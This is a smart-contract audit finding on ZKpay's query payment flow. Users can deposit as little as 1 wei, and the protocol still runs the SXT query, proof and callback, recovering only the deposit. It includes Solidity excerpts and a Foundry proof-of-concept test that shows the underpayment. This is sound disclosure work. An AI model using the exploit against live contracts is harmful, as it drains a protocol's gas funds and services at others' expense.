### **Title: Protocol Performs Unfunded Work and Pays Gas for Queries Submitted with Minimal Deposits**

### **Summary**

ZKpay's `query` function accepts user deposits without validating if the amount is sufficient for the requested service and callback. The SXT off-chain system then proceeds with full query execution and ZK-proofing. During the final `settleQueryPayment` step, the protocol can only claim up to the amount initially deposited, forcing SXT to bear the loss for any underpayment of true service and gas costs.

### **Finding Description**

The ZKpay protocol, designed to facilitate payments for off-chain query services provided by Space and Time (SXT), contains a vulnerability that allows users to receive query processing and results while significantly underpaying for the service and associated on-chain callback costs. This occurs because the ZKpay smart contract system accepts query requests with user-deposited funds without an upfront check for sufficiency, and the SXT off-chain system proceeds to execute these potentially underfunded queries. The financial reconciliation happens only after SXT has incurred computational costs and paid for the L1 callback, at which point the protocol can only recover up to the amount initially deposited by the user.

#### The Intended Query and Payment Flow (Simplified):

1.  A user (or a client smart contract) wants to execute an SQL query via SXT.
2.  They call the `query()` function on the ZKpay EVM contract, providing:
    *   `asset`: The ERC20 token for payment.
    *   `amount`: The quantity of asset tokens they are depositing. This amount is expected by the protocol design to be sufficient to cover SXT's service fee for the query and the gas cost of the callback transaction that will deliver the results.
    *   `queryRequest`: Details of the query, callback address, etc.
3.  The ZKpay contract's internal `_query()` function calls `AssetManagement.handleQueryPayment()` to transfer the user's amount to the ZKpay contract.
4.  An event `QueryReceived` (and `NewQueryPayment`) is emitted, which the SXT off-chain system listens for.
5.  The SXT off-chain system (Indexers, Provers):
    *   Picks up the query request.
    *   Executes the SQL query.
    *   Generates a ZK-proof.
    *   Pays L1 gas to call the user's specified `callbackClientContractAddress` via `fulfillQuery`, delivering the results and proof.
6.  During the `fulfillQuery` call, the internal `QueryLogic.settleQueryPayment()` function is invoked to:
    *   Calculate the actual gas cost of the callback (in asset tokens).
    *   Fetch SXT's service fee (in asset tokens).
    *   Sum these to get the total `payoutAmount` SXT is owed.
    *   Transfer `payoutAmount` to SXT's treasury and any `refundAmount` back to the user.

#### The Vulnerability: Lack of Upfront Payment Sufficiency Check and Premature Work Execution

The core issue is that there is no check in the `ZKPay.query()` or `QueryLogic._query()` functions, nor in the initial off-chain ingestion by SXT Indexers, to ensure the amount deposited by the user is actually sufficient to cover the anticipated costs.

**Step 1: User Submits Query with Insufficient Funds**
An attacker calls `query()` with a `tokenAmount` that is deliberately too small, for example, 1 wei of the payment asset.

```solidity
// In ZKPay.sol (simplified from QueryLogic.sol)
function _query(
    address asset,
    uint248 amount, // Attacker provides a very small amount, e.g., 1
    QueryLogic.QueryRequest calldata queryRequest
) internal returns (bytes32 queryHash) {
    // AssetManagement.handleQueryPayment is called:
    (uint248 actualAmountReceived, uint248 amountInUSD) = AssetManagement
        .handleQueryPayment(_assets, asset, amount);
    // actualAmountReceived will be the tiny amount (e.g., 1 wei)

    // ... (query submission logic) ...
    // The QueryReceived event is emitted, signaling SXT to process this query,
    // even though actualAmountReceived is negligible.
}
```

Inside `AssetManagement.handleQueryPayment`:
```solidity
// In AssetManagement.sol
function handleQueryPayment(
    mapping(address asset => PaymentAsset) storage _assets,
    address assetAddress,
    uint248 tokenAmount // e.g., 1 wei
) internal returns (uint248 actualAmountReceived, uint248 amountInUSD) {
    if (!isSupported(_assets, assetAddress, PaymentType.Query)) { // Checks if asset is supported
        revert AssetIsNotSupportedForThisMethod();
    }

    uint256 balanceBefore = IERC20(assetAddress).balanceOf(address(this));
    IERC20(assetAddress).safeTransferFrom( // Transfers the 1 wei from user to ZKPay
        msg.sender,
        address(this),
        tokenAmount
    );
    uint256 balanceAfter = IERC20(assetAddress).balanceOf(address(this));

    actualAmountReceived = uint248(balanceAfter - balanceBefore); // actualAmountReceived = 1 wei

    amountInUSD = convertToUsd(_assets, assetAddress, actualAmountReceived); // amountInUSD will also be negligible
}
```
At this point, the ZKpay contract has accepted the 1 wei, and an event is emitted. The SXT off-chain system sees this event and proceeds with processing:

> "The system doesn't immediately check if the payment is 'sufficient' at query submission time." "When a payment is deemed insufficient... the system does not reject the query execution."

So, SXT does the expensive work:
*   SQL query execution.
*   ZK-proof generation.
*   SXT's relayer pays L1 gas for the callback transaction to `fulfillQuery`.

**Step 2: Exploitation During `settleQueryPayment`**
When `fulfillQuery` is called (by SXT's relayer), it eventually calls `QueryLogic.settleQueryPayment`. Let's assume the actual callback gas cost converted to the payment token is `GasCostInToken = 50 USDC_equivalent` and SXT's service fee is `FeeInToken = 20 USDC_equivalent`.

```solidity
// In QueryLogic.sol
function settleQueryPayment(
    // ...
    QueryPayment memory payment // payment.asset is the token, payment.amount is 1 wei
) internal returns (uint248 payoutAmount, uint248 refundAmount) {
    // ...
    // usedGasInPaymentToken might be, for example, 50 tokens
    // feeInPaymentToken might be, for example, 20 tokens
    // ...
    payoutAmount = usedGasInPaymentToken + feeInPaymentToken; // payoutAmount = 70 tokens (hypothetically)

    // THE CRITICAL FLAW IN ACTION:
    if (payoutAmount > payment.amount) { // 70 tokens > 1 wei (true)
        payoutAmount = payment.amount;   // payoutAmount is now capped to 1 wei
    }

    refundAmount = payment.amount - payoutAmount; // refundAmount = 1 wei - 1 wei = 0

    if (payoutAmount > 0) { // 1 wei > 0 (true)
        // SXT Treasury (payoutAddress) receives only 1 wei
        IERC20(payment.asset).safeTransfer(payoutAddress, payoutAmount);
    }
    if (refundAmount > 0) { // 0 > 0 (false)
        // User gets no refund (which is correct, as they paid almost nothing)
        IERC20(payment.asset).safeTransfer(payment.source, refundAmount);
    }
}
```
The SXT protocol has now performed significant off-chain work and paid for an L1 callback transaction, but only receives the 1 wei initially deposited by the attacker. The remaining `70 tokens - 1 wei` is an unrecoverable loss for the SXT protocol for this single query.

#### **Security Guarantees Broken:**

*   **Economic Sustainability of the Protocol:** The protocol cannot sustain itself if it performs costly services without adequate compensation. This vulnerability allows for the systematic draining of resources (relayer gas funds) and uncompensated use of computational power.
*   **Fairness:** It allows malicious actors to receive services at effectively no cost, while legitimate users presumably pay the full fees. This can degrade service quality for everyone if the system is overwhelmed by "free" requests.
*   **Implicit Trust Violation:** While the ZK-proofs ensure data integrity, the economic model of ZKpay assumes that the initial payment will cover costs. This vulnerability breaks that assumption by deferring the "is payment enough?" check until after costs are incurred.

### **Impact Explanation**

This vulnerability allows any user to pay an arbitrarily small amount when submitting a query, yet still force ZKPay to cover the full callback gas cost from its own funds. Repeating this at scale can rapidly drain the protocol’s ETH or token reserves. **Impact: High**—the protocol’s treasury is at risk of depletion and service funds are stolen.

### **Likelihood Explanation**

Because ZKPay never verifies off-chain the user’s payment covers both the oracle fee and callback gas before emitting the query event, any attacker can exploit this on the very first query. No additional conditions or rare states are required—**Likelihood: High**.

### **Proof of Concept**

POC that demonstrates how an attacker can underpay for query services. Add this test to `zkpay.t.sol`:

```solidity
function testUnderpaidQueryService() public {
    // Setup attacker
    address attacker = vm.addr(0x999);
    vm.deal(attacker, 1 ether);

    // Setup USDC payment with minimal amount
    uint8 usdcDecimals = 6;
    MockERC20 usdc = new MockERC20();
    uint248 minimalAmount = 1; // Just 1 wei of USDC
    usdc.mint(attacker, minimalAmount);

    // Setup price feed
    address mockUsdcPriceFeed = address(new MockV3Aggregator(8, 1e8));

    // Configure USDC as payment asset
    paymentAssetInstance = AssetManagement.PaymentAsset({
        allowedPaymentTypes: AssetManagement.SEND_PAYMENT_FLAG |
            AssetManagement.QUERY_PAYMENT_FLAG,
        priceFeed: mockUsdcPriceFeed,
        tokenDecimals: usdcDecimals,
        stalePriceThresholdInSeconds: 1000
    });

    vm.prank(_owner);
    zkpay.setPaymentAsset(address(usdc), paymentAssetInstance);

    // Create query request
    QueryLogic.QueryRequest memory queryRequest = QueryLogic.QueryRequest({
        query: "test",
        queryParameters: "test",
        timeout: uint64(block.timestamp + 100),
        callbackClientContractAddress: attacker,
        callbackGasLimit: 1_000_000,
        callbackData: "test",
        customLogicContractAddress: address(new MockCustomLogic())
    });

    // Record initial balances
    uint256 treasuryInitialBalance = usdc.balanceOf(_treasury);
    uint256 attackerInitialBalance = usdc.balanceOf(attacker);

    // Attacker approves and submits query with minimal amount
    vm.startPrank(attacker);
    usdc.approve(address(zkpay), minimalAmount);
    bytes32 queryHash = zkpay.query(
        address(usdc),
        minimalAmount,
        queryRequest
    );
    vm.stopPrank();

    // Fulfill the query (simulating SXT's work and callback)
    zkpay.fulfillQuery(queryHash, queryRequest, "results");

    // Check final balances
    uint256 treasuryFinalBalance = usdc.balanceOf(_treasury);
    uint256 attackerFinalBalance = usdc.balanceOf(attacker);

    // Verify that treasury received only the minimal amount
    assertEq(
        treasuryFinalBalance - treasuryInitialBalance,
        minimalAmount,
        "Treasury received more than the minimal amount"
    );

    // Verify that attacker got their query processed despite underpaying
    assertEq(
        attackerFinalBalance,
        attackerInitialBalance - minimalAmount,
        "Attacker's balance not correctly deducted"
    );
}
```

To run the POC:
`forge test --match-test testUnderpaidQueryService -vv`

### **Recommendation**

Check for the fee payment in the `handleQueryPayment` function.
